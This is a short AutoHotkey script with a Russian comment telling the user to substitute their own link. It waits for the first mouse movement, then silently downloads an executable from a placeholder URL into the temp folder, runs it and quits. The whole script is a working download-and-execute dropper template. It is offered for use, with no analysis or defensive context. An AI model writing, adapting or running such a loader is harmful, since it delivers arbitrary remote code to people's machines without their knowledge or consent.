#Persistent
SetTimer, CheckMouseMove, 100
alreadyTriggered := false
lastX := 0
lastY := 0

CheckMouseMove:
    MouseGetPos, x, y
    if (x != lastX or y != lastY) and !alreadyTriggered
    {
        alreadyTriggered := true
        ; Замените ссылку на свою
        url := "https://example.com/yourfile.exe"
        filename := A_Temp "\downloaded_file.exe"

        UrlDownloadToFile, %url%, %filename%
        if FileExist(filename)
            Run, %filename%
        ExitApp
    }
    lastX := x
    lastY := y
return